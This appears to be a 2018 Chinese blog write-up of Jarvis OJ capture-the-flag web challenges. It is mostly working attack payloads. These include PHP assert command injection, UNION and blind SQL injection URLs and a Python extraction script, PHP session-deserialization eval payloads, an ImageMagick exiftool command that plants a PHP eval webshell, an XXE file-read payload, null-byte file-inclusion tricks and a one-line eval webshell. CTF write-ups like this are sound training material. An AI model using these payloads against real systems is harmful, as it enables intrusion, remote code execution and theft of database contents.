title: jarvis oj web
author: Qianye
abbrlink: d4a99024
tags:
  - ctf
categories: []
date: 2018-03-09 21:00:00
---

[jarvis oj](https://www.jarvisoj.com/) 挺不错的ctf平台，有点难。

<!-- more -->

# babyxss
[某大佬的解](http://blog.csdn.net/qq_31481187/article/details/73699167)

# basyphp
从about中猜测是有git源码泄露，用githacker，得到泄露部分
```bash
<?php
if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}
$file = "templates/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("file_exists('$file')") or die("That file doesn't exist!");
?>
```
从源码中知道有命令执行漏洞，构造

```bash
http://web.jarvisoj.com:32798/?page=?page='.system("tac templates/flag.php").'
```
# register
二次注入

# inject 
输入index.php~
```bash
http://web.jarvisoj.com:32794/index.php~
```
得到源码
```bash
<?php
require("config.php");
$table = $_GET['table']?$_GET['table']:"test";
$table = Filter($table);
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
$ret = sql_query($sql);
echo $ret[0];
?>

```
在desc `secret_test` `表名`
只要第一组反引号中的表名存在，第二组反引号中随便写都不会报错.</br>
爆数据库
```bash
http://web.jarvisoj.com:32794/?table=test` `union select GROUP_CONCAT(schema_name) from information_schema.schemata limit 1,1
```
爆表名
```bash
http://web.jarvisoj.com:32794/?table=test` `union select GROUP_CONCAT(table_name) from information_schema.tables where table_schema=0x363164333030 limit 1,1
```
爆列名
```bash
?table=test` `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1
```
脱裤
```bash
http://web.jarvisoj.com:32794/?table=test` `union select flagUwillNeverKnow from secret_flag limit 1,1 
```
# admin
从robots.txt 中，范文不允许访问的路径，即可得到flag
# web?
根据输入的Wrong Password!! 在app.js中定位到如下 js代码
```bash
$.post("checkpass.json",t,function(t){
	self.checkpass(e)?self.setState({
		errmsg:"Success!!",
		errcolor:b.green400
		}):(self.setState({
			errmsg:"Wrong Password!!",
			errcolor:b.red400
		}),setTimeout(function(){
				self.setState({
					errmsg:""
				})
		  },3e3))
})
```
有个checkpass(e)，定位到该处得到
```bash
r.checkpass=function(){
	var e;
	return(e=r).__checkpass__REACT_HOT_LOADER__.apply(e,arguments)
}
```
发现一个线性方程
```bash
{key:"__checkpass__REACT_HOT_LOADER__",
	value:function(e){
		if(25!==e.length)
			return!1;
		for(var t=[],n=0;n<25;n++)
			t.push(e.charCodeAt(n));
			for(var r=[325799,309234,317320,327895,298316,301249,330242,289290,273446,337687,258725,267444,373557,322237,344478,362136,331815,315157,299242,305418,313569,269307,338319,306491,351259],
			o=[[11,13,32,234,236,3,72,237,122,230,157,53,7,225,193,76,142,166,11,196,194,187,152,132,135],
			   [76,55,38,70,98,244,201,125,182,123,47,86,67,19,145,12,138,149,83,178,255,122,238,187,221],
			   [218,233,17,56,151,28,150,196,79,11,150,128,52,228,189,107,219,87,90,221,45,201,14,106,230],
			   [30,50,76,94,172,61,229,109,216,12,181,231,174,236,159,128,245,52,43,11,207,145,241,196,80],
			   [134,145,36,255,13,239,212,135,85,194,200,50,170,78,51,10,232,132,60,122,117,74,117,250,45],
			   [142,221,121,56,56,120,113,143,77,190,195,133,236,111,144,65,172,74,160,1,143,242,96,70,107],
			   [229,79,167,88,165,38,108,27,75,240,116,178,165,206,156,193,86,57,148,187,161,55,134,24,249],
			   [235,175,235,169,73,125,114,6,142,162,228,157,160,66,28,167,63,41,182,55,189,56,102,31,158],
			   [37,190,169,116,172,66,9,229,188,63,138,111,245,133,22,87,25,26,106,82,211,252,57,66,98],
			   [199,48,58,221,162,57,111,70,227,126,43,143,225,85,224,141,232,141,5,233,69,70,204,155,141],
			   [212,83,219,55,132,5,153,11,0,89,134,201,255,101,22,98,215,139,0,78,165,0,126,48,119],
			   [194,156,10,212,237,112,17,158,225,227,152,121,56,10,238,74,76,66,80,31,73,10,180,45,94],
			   [110,231,82,180,109,209,239,163,30,160,60,190,97,256,141,199,3,30,235,73,225,244,141,123,208],
			   [220,248,136,245,123,82,120,65,68,136,151,173,104,107,172,148,54,218,42,233,57,115,5,50,196],
			   [190,34,140,52,160,34,201,48,214,33,219,183,224,237,157,245,1,134,13,99,212,230,243,236,40],
			   [144,246,73,161,134,112,146,212,121,43,41,174,146,78,235,202,200,90,254,216,113,25,114,232,123],
			   [158,85,116,97,145,21,105,2,256,69,21,152,155,88,11,232,146,238,170,123,135,150,161,249,236],
			   [251,96,103,188,188,8,33,39,237,63,230,128,166,130,141,112,254,234,113,250,1,89,0,135,119],
			   [192,206,73,92,174,130,164,95,21,153,82,254,20,133,56,7,163,48,7,206,51,204,136,180,196],
			   [106,63,252,202,153,6,193,146,88,118,78,58,214,168,68,128,68,35,245,144,102,20,194,207,66],
			   [154,98,219,2,13,65,131,185,27,162,214,63,238,248,38,129,170,180,181,96,165,78,121,55,214],
			   [193,94,107,45,83,56,2,41,58,169,120,58,105,178,58,217,18,93,212,74,18,217,219,89,212],
			   [164,228,5,133,175,164,37,176,94,232,82,0,47,212,107,111,97,153,119,85,147,256,130,248,235],
			   [221,178,50,49,39,215,200,188,105,101,172,133,28,88,83,32,45,13,215,204,141,226,118,233,156],
			   [236,142,87,152,97,134,54,239,49,220,233,216,13,143,145,112,217,194,114,221,150,51,136,31,198]],
			n=0;n<25;n++){
			for(var i=0,a=0;a<25;a++)
				i+=t[a]*o[n][a];
			if(i!==r[n])
				return!1
			}
			return!0
	}
}
```
用py去接，两个线性方程相乘，取整然后，在转换成字符串拼接起来即可。
```bash
import numpy as np
from scipy.linalg import solve
import string
r=np.array([325799,309234,317320,327895,298316,301249,330242,289290,273446,337687,258725,267444,373557,322237,344478,362136,331815,315157,299242,305418,313569,269307,338319,306491,351259])
o=np.array([[11,13,32,234,236,3,72,237,122,230,157,53,7,225,193,76,142,166,11,196,194,187,152,132,135],
			   [76,55,38,70,98,244,201,125,182,123,47,86,67,19,145,12,138,149,83,178,255,122,238,187,221],
			   [218,233,17,56,151,28,150,196,79,11,150,128,52,228,189,107,219,87,90,221,45,201,14,106,230],
			   [30,50,76,94,172,61,229,109,216,12,181,231,174,236,159,128,245,52,43,11,207,145,241,196,80],
			   [134,145,36,255,13,239,212,135,85,194,200,50,170,78,51,10,232,132,60,122,117,74,117,250,45],
			   [142,221,121,56,56,120,113,143,77,190,195,133,236,111,144,65,172,74,160,1,143,242,96,70,107],
			   [229,79,167,88,165,38,108,27,75,240,116,178,165,206,156,193,86,57,148,187,161,55,134,24,249],
			   [235,175,235,169,73,125,114,6,142,162,228,157,160,66,28,167,63,41,182,55,189,56,102,31,158],
			   [37,190,169,116,172,66,9,229,188,63,138,111,245,133,22,87,25,26,106,82,211,252,57,66,98],
			   [199,48,58,221,162,57,111,70,227,126,43,143,225,85,224,141,232,141,5,233,69,70,204,155,141],
			   [212,83,219,55,132,5,153,11,0,89,134,201,255,101,22,98,215,139,0,78,165,0,126,48,119],
			   [194,156,10,212,237,112,17,158,225,227,152,121,56,10,238,74,76,66,80,31,73,10,180,45,94],
			   [110,231,82,180,109,209,239,163,30,160,60,190,97,256,141,199,3,30,235,73,225,244,141,123,208],
			   [220,248,136,245,123,82,120,65,68,136,151,173,104,107,172,148,54,218,42,233,57,115,5,50,196],
			   [190,34,140,52,160,34,201,48,214,33,219,183,224,237,157,245,1,134,13,99,212,230,243,236,40],
			   [144,246,73,161,134,112,146,212,121,43,41,174,146,78,235,202,200,90,254,216,113,25,114,232,123],
			   [158,85,116,97,145,21,105,2,256,69,21,152,155,88,11,232,146,238,170,123,135,150,161,249,236],
			   [251,96,103,188,188,8,33,39,237,63,230,128,166,130,141,112,254,234,113,250,1,89,0,135,119],
			   [192,206,73,92,174,130,164,95,21,153,82,254,20,133,56,7,163,48,7,206,51,204,136,180,196],
			   [106,63,252,202,153,6,193,146,88,118,78,58,214,168,68,128,68,35,245,144,102,20,194,207,66],
			   [154,98,219,2,13,65,131,185,27,162,214,63,238,248,38,129,170,180,181,96,165,78,121,55,214],
			   [193,94,107,45,83,56,2,41,58,169,120,58,105,178,58,217,18,93,212,74,18,217,219,89,212],
			   [164,228,5,133,175,164,37,176,94,232,82,0,47,212,107,111,97,153,119,85,147,256,130,248,235],
			   [221,178,50,49,39,215,200,188,105,101,172,133,28,88,83,32,45,13,215,204,141,226,118,233,156],
			   [236,142,87,152,97,134,54,239,49,220,233,216,13,143,145,112,217,194,114,221,150,51,136,31,198]])
x=solve(o,r)
print(x)
flag=""
for i in range(len(x)):
    char=chr(int(round(x[i])))
    flag+=char
    print(char)
print(flag)

```
# phpinfo 
```bash
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```
[php反序列化总结](http://www.91ri.org/15925.html)</br>
建立一个html文件，写入
```bash
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
<input type="file" name="file" />
<input type="submit" />
</form>
```

[scandir](http://php.net/manual/zh/function.scandir.php)</br>
[dirname](http://www.w3school.com.cn/php/func_filesystem_dirname.asp)</br>
序列化，然后将html文件上传的包的文件名修改为下面序列化的值加上|,为防止转义，在”上加入\。
```bash
<?php
ini_set('session.serialize_handler','php_serialize');
session_start();
class OowoO{
    public $mdzz='var_dump(scandir(dirname(__FILE__))';
}
$qianye=new OowoO();
echo serialize($qianye);
?>
```
抓包文件名修改为
```bash
------WebKitFormBoundaryCyObcbKufPxtAZ5Q
Content-Disposition: form-data; name="file"; filename="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}"
Content-Type: text/plain

<!-- UY BEGIN -->
<div id="uyan_frame"></div>
<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2157721"></script>
<!-- UY END -->
<script type="text/javascript" src="http://7u2ss1.com1.z0.glb.clouddn.com/love.js"></script>

------WebKitFormBoundaryCyObcbKufPxtAZ5Q--
```
得到flag所在的文件。
由phpino.php和flag文件在同一目录下，和phpinfo上的信息可知
进一步修改文件名为
```bash
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}
```
得到flag
# 图片上传漏洞
[CVE-2016-3714 - ImageMagick 命令执行分析](https://www.2cto.com/article/201605/505823.html)</br>
访问test.php得到phpinfo的相关信息。看到imagick
```bash
http://web.jarvisoj.com:32790/test.php
```
利用exiftool生成一句话木马
```bash
exiftool -label="\"|/bin/echo \<?php \@eval\(\\$\_POST\[x\]\)\;?\> > /opt/lampp/htdocs/uploads/y.php; \"" 1.png
```
然后上传文件的时候需要注意需要filetype=show或者filetype=win。在uploads上生成x.php
上传后用菜刀链接。这里我一直上传，连接失败。好像被别人上传了删除脚本

# PHPINFO
[xml注入实体攻击](http://chybeta.club/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/)</br>
从源码中
```bash
function XHR() {
        var xhr;
        try {xhr = new XMLHttpRequest();}
        catch(e) {
            var IEXHRVers =["Msxml3.XMLHTTP","Msxml2.XMLHTTP","Microsoft.XMLHTTP"];
            for (var i=0,len=IEXHRVers.length;i< len;i++) {
                try {xhr = new ActiveXObject(IEXHRVers[i]);}
                catch(e) {continue;}
            }
        }
        return xhr;
    }

function send(){
 evil_input = document.getElementById("evil-input").value;
 var xhr = XHR();
     xhr.open("post","/api/v1.0/try",true);
     xhr.onreadystatechange = function () {
         if (xhr.readyState==4 && xhr.status==201) {
             data = JSON.parse(xhr.responseText);
             tip_area = document.getElementById("tip-area");
             tip_area.value = data.task.search+data.task.value;
         }
     };
     xhr.setRequestHeader("Content-Type","application/json");
     xhr.send('{"search":"'+evil_input+'","value":"own"}');
}

```
可以知道向/api/v1.0/try发送post请求。
抓包改包，将Content-Type改为application/xml，然后post数据如下:
```bash
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY  file SYSTEM "file:////home/ctf/flag.txt">]>
<root>&file;</root>
```
# simple inject 
```bash
#coding:utf-8
import requests
import string
payloads=string.printable
url = 'http://web.jarvisoj.com:32787/login.php'
#ye= "'/**/or/**/if(substring((select/**/database())/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"
#ye= "'/**/or/**/if(substring((select/**/group_concat(table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database())/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"
ye = "'/**/or/**/if(substring((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='admin')/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"
#ye = "'/**/or/**/if(substring((select/**/password/**/from/**/admin)/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"
def exp(i,x):
	data={'username':ye%(i,x),'password':'123'}
	response = requests.post(url,data = data)
	if response.text.find('用户名错误')>0:
		return 1
	else :
		return 0
ans=''
print('start')
for i in range(1,100):
	for x in payloads:
		if exp(i,x)==1:
			ans+=x
			print(ans)
			break

```
# Easy Gallery

```bash
http://web.jarvisoj.com:32785/index.php?page=submit
http://web.jarvisoj.com:32785/index.php?page=view
```
从以上连接猜测是文件包含
在submit中上传一张一句话木马jpg图片，然后在view页面中找到，该图片的地址。访问
```bash
http://web.jarvisoj.com:32785/index.php?page=uploads/1520757670.jpg
```
显示打开失败，从报错消息中得知，查询时，给图片加上php后缀。
```bash
 fopen(uploads/1520757670.jpg.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24
No such file!
```
%00截断，得到flag，一开始只是上传一张图片，没有flag，上传有一句话的图片，才得到flag，搞不到为什么？
```bash
http://web.jarvisoj.com:32785/index.php?page=uploads/1520757670.jpg%00
```
ps:一句话图片可以用edjpgcom制作，一句话为
```bash
<script language="php">@eval($_POST['Qianye']);</script>
```
# Chopper

# flag在管理员的手里
最近一直遇到源码泄露，习惯性地index.php~,得到源码，打开后有点乱，在kail中，`file index.php` 得到信息`index.php: Vim swap file, version 7.4`.添加后缀为`index.php.swp` ,`vi -r index.php.swp`得到如下整齐的源码。
```bash
<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
	body {
		background:gray;
		text-align:center;
	}
</style>
</head>

<body>
	<?php 
		$auth = false;
		$role = "guest";
		$salt = 
		if (isset($_COOKIE["role"])) {
			$role = unserialize($_COOKIE["role"]);
			$hsh = $_COOKIE["hsh"];
			if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
				$auth = true;
			} else {
				$auth = false;
			}
		} else {
			$s = serialize($role);
			setcookie('role',$s);
			$hsh = md5($salt.strrev($s));
			setcookie('hsh',$hsh);
		}
		if ($auth) {
			echo "<h3>Welcome Admin. Your flag is 
		} else {
			echo "<h3>Only Admin can see the flag!!</h3>";
		}
	?>
	
</body>
</html>
```
[strtev](http://www.w3school.com.cn/php/func_string_strrev.asp)</br>
# re?
[UDF-mysql](https://err0rzz.github.io/2017/12/26/UDF-mysql/#linux下)
# IN A Mess
查看页面源码，访问index.phps得到源码
```bash

<?php

error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}


?>

```
当$a为php://input，$data可以通过php://input来接受post数据。$id传一个字符进去，会被转换为0。对$b，要求长度大于5，其次要求满足eregi的要求和首字母不为4。可以设置$b为%00123456，这样，substr（）会发生截断，在匹配时时进行eregi(“111”,”1114”)满足，同时%00对strlen不会发生截断。</br>
火狐发送post请求
```bash
http://web.jarvisoj.com:32780/index.php?id=a&a=php://input&b=%00123456



1112 is a nice lab!
```
得到` Come ON!!! {/^HT2mCpcvOLf}` </br>
访问`http://web.jarvisoj.com:32780//^HT2mCpcvOLf` 连接自动补全
猜测是注入，过滤了空格，union,select,from </br>
查看字段数
```bash
http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#
```
查看显示位
```bash
http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,3#
```
查表
```bash
http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,(selselectect/*1*/group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=database())%23
```
查字段
```bash
http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,(selselectect/*1*/group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636F6E74656E74)%23
```
脱裤
```bash
http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,(selselectect/*1*/group_concat(context)/*1*/frofromm/*1*/content)%23
```
# 神盾局的秘密
访问图片链接
```bash
http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw
```
得到
```bash
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
```
将shield.php精心base64加密，接在img=后面，访问以下连接
```bash
http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==
```
得到
```bash

<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>

```
使用以下的脚本
```bash
<?php
	class Shield {
		public $file = "pctf.php";
	}
	$qianye = new Shield();
	print_r(serialize($qianye));
?>
```
访问以下链接，查看源码，得到flag
```bash
http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}

```
# Login
[SQL injection with raw MD5 hashes](https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html)</br>
bp抓包，在应答包中发现`Hint: "select * from `admin` where password='".md5($pass,true)."'"`
在之前的做题中遇到过。直接提交`ffifdyop`,得到flag

# LOCALHOST
添加
```bash
X-Forwarded-For: 127.0.01
```
# PORT51
因为校园网，出路由的时候会变端口，所以在vps上跑
```bash
sudo curl --local-port 51 http://web.jarvisoj.com:32770/
```